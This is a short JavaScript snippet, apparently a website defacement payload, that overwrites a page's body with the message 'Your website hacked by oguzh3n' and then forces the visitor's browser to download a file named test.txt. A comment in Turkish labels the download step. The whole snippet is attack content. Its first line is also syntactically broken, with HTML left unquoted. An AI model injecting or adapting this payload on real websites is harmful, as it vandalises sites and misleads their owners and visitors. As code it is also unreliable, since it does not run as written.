document.body.innerHTML = <h3>Hello admin!</h3> <p>Your website hacked by oguzh3n</p> <p>Improve your security.</p>;

// test.txt dosyası oluşturma const blob = new Blob(["This is a security test."], { type: "text/plain" }); const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "test.txt"; document.body.appendChild(a); a.click(); document.body.removeChild(a);

